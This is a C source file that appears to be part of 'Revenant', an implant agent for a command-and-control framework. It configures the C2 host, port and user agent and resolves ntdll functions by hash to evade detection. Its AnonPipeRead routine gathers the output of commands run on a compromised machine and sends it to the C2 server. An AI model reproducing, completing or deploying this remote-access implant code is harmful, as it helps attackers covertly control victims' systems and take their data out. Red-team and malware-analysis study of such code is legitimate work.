#include "Asm.h"
#include "Core.h"
#include "Config.h"
#include "Package.h"
#include "Command.h"
#include "Revenant.h"
#include "Obfuscation.h"

#include <stdio.h>

VOID RvntInit() {
    // Init Connection info
    Instance.Config.Transport.UserAgent = CONFIG_USER_AGENT;
    Instance.Config.Transport.Host      = CONFIG_HOST;
    Instance.Config.Transport.Port      = CONFIG_PORT;
    Instance.Config.Transport.Secure    = CONFIG_SECURE;

    // Init Win32
#if CONFIG_ARCH == x64
    void *ntdll_base = get_ntdll_64();
#else
    void *ntdll_base = get_ntdll_32();
#endif

    Instance.Win32.RtlRandomEx   = get_proc_address_by_hash(ntdll_base, RtlRandomEx_CRC32B);
    Instance.Win32.RtlGetVersion = get_proc_address_by_hash(ntdll_base, RtlGetVersion_CRC32B);

    Instance.Session.AgentID = RandomNumber32();
    Instance.Config.Sleeping = CONFIG_SLEEP;

    _tprintf( "AgentID     => %x\n", Instance.Session.AgentID );
    _tprintf( "Magic Value => %x\n", RVNT_MAGIC_VALUE );
}

void AnonPipeRead( HANDLE hSTD_OUT_Read ) {
    PPACKAGE Package         = NULL;
    LPVOID   pOutputBuffer   = NULL;
    UCHAR    buf[ 1025 ]     = { 0 };
    DWORD    dwBufferSize    = 0;
    DWORD    dwRead          = 0;
    BOOL     SuccessFul      = FALSE;

    pOutputBuffer = LocalAlloc( LPTR, sizeof(LPVOID) );

    do {
        SuccessFul = ReadFile( hSTD_OUT_Read, buf, 1024, &dwRead, NULL );
        if ( dwRead == 0)
            break;

        pOutputBuffer = LocalReAlloc(
                pOutputBuffer,
                dwBufferSize + dwRead,
                LMEM_MOVEABLE | LMEM_ZEROINIT
        );

        dwBufferSize += dwRead;
        memcpy( pOutputBuffer + ( dwBufferSize - dwRead ), buf, dwRead );
        memset( buf, 0, dwRead );
    } while ( SuccessFul == TRUE );

    Package = PackageCreate( COMMAND_OUTPUT );

    PackageAddBytes( Package, pOutputBuffer, dwBufferSize );
    PackageTransmit( Package, NULL, NULL );
    memset( pOutputBuffer, 0, dwBufferSize );
    LocalFree( pOutputBuffer );
    pOutputBuffer = NULL;
}

ULONG RandomNumber32(void) {
    ULONG Seed = 0;

    Seed = GetTickCount();
    Seed = Instance.Win32.RtlRandomEx( &Seed );
    Seed = Instance.Win32.RtlRandomEx( &Seed );
    Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;

    return Seed % 2 == 0 ? Seed : Seed + 1;
}
